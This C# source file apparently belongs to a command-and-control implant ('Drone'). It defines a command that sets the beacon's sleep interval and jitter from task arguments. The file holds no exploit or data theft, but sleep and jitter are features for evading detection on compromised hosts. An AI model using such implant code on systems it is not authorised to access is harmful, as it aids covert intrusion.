using System.Threading;
using System.Threading.Tasks;

namespace Drone.Commands;

public class SetSleep : DroneCommand
{
    public override byte Command => 0x01;
    public override bool Threaded => false;
    
    public override Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        if (task.Arguments.TryGetValue("interval", out var interval))
            Drone.Config.Set(Setting.SLEEP_INTERVAL, int.Parse(interval));
        
        if (task.Arguments.TryGetValue("jitter", out var jitter))
            Drone.Config.Set(Setting.SLEEP_JITTER, int.Parse(jitter));
        
        return Task.CompletedTask;
    }
}